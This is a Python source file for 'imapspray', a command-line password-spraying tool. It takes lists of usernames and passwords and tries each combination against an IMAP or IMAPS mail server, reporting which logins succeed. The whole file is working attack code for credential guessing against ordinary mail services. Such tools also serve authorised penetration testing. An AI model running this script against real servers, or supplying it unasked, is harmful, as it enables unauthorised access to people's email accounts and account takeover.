import argparse, imaplib, re, pathlib, termcolor
from util.printfuncs import *

def read_lines(filepath: str) -> tuple:
    '''Reads lines from a file. Returns tuple (str | None, list) containing error message (if any), list<str>'''
    lines = []
    error = None
    try:
        with open(filepath, 'r') as file:
            raw = file.readlines()
            for line in raw:
                lines.append(line.strip())
    except Exception as err:
        error = f'Error reading from file: \'{filepath}\': {err}'
    
    return (error, lines)


def validate_args(args: argparse.Namespace) -> dict:
    '''Ingests argsparse args, performs validation, and derives any options and format into a dict'''
    errors = []

    if not re.match('^imap[s]?://[a-zA-Z0-9-_\.]*$', args.host):
        errors.append(f'Invalid host format \'{args.host} does not start with \'imap://\' or \'imaps://\' or contains invalid characters')
    else: # extract host
        idx = args.host.find('/')+2 # index of character after SECOND /
        target = args.host[idx::]
    
    # Handle username(s)
    usersfile = pathlib.Path(args.users)
    usernames = []
    if usersfile.exists():
        error, usernames = read_lines(usersfile)
        if error != None: errors.append(error)
    else: usernames = [user for user in args.users.split(',')] # handle as a sring, split usernames on commas

    # Handle password(s)
    passfile = pathlib.Path(args.password)
    passwords = []
    if passfile.exists():
        error, passwords = read_lines(passfile)
        if error != None: errors.append(error)
    else: passwords = [args.password] # Just attempt the one password

    # Handle domain
    if args.domain != None:
        usernames = [f'{name}@{args.domain}' for name in usernames]

    # Handle port
    ssl = args.host.startswith('imaps://')
    port = None
    if args.port == None:
        port = 993 if (ssl) else 143
    else:
        port = args.port
        if not (args.port > 0 and args.port < 65535):
            errors.append('Supplied port not within range 1-65534')

    if len(errors) > 0:
        for msg in errors:
            print_error(msg)
        exit()
    
    return {
        'Target': target,
        'SSL': ssl,
        'Port': port,
        'Usernames': usernames,
        'Passwords': passwords
    }
        

def attempt_auth(target: str, ssl: bool, port: int, username: str, password: str) -> None:
    '''Attempts to authenticate over imap / imaps'''
    if ssl:
        imap = imaplib.IMAP4_SSL(target, port)
    else:
        imap = imaplib.IMAP4(target, port)
    
    try:
        res = imap.login(username, password)
        print_success(f'Login success - {username}:{password}')
    except imaplib.IMAP4.error as err:
        if ('Authentication failed' in f'{err}'):
            print_failure(f'Login failed - {username}:{password}')
        else:
            print_error(f'Error during authentication: {err}')

    return None


if __name__ == '__main__':
    parser = argparse.ArgumentParser('imapspray.py', 'python3 imapspray.py HOST [--domain][--users][--password][--port][--continue-on-success]')
    parser.add_argument('host', type=str, help='Target IMAP/S host (format: imap://HOST or imaps://HOST)', )
    parser.add_argument('-u', '--users', required=True, type=str, help='List of users (comma separated) or path to file containing usernames, one per line')
    parser.add_argument('-p', '--password', required=True, type=str, help='Password to attempt against user(s). Single password OR path to file containing passwords, one per line')
    parser.add_argument('-d', '--domain', required=False, default=None, help='If provided, formats usernames into email addresses for the given domain')
    parser.add_argument('--port', required=False, default=None, type=int, help='Port to override (default derived from host schema)')

    args = parser.parse_args()
    options = validate_args(args)

    for password in options['Passwords']:
        for user in options['Usernames']:
            attempt_auth(options['Target'], options['SSL'], options['Port'], user, password)

    


